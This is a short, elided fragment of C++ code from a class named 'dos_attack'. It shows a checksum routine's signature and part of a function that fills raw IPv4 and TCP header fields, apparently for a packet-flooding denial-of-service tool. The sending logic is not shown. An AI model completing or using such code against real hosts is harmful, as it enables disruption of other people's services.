...
unsigned short dos_attack::csum (unsigned short *buf, int nwords)
{
  unsigned long sum;
...
void dos_attack::Fill(ip *ip, tcphdr *tcp, sockaddr_in *addr, int port){
  ip->ip_hl = 5;
  ip->ip_v = 4;
  ip->ip_tos = 0;
  ip->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
  ip->ip_id = htons(12345);//Random value
  ip->ip_off = 0;
  ip->ip_ttl = 255;
  ip->ip_p = 6;
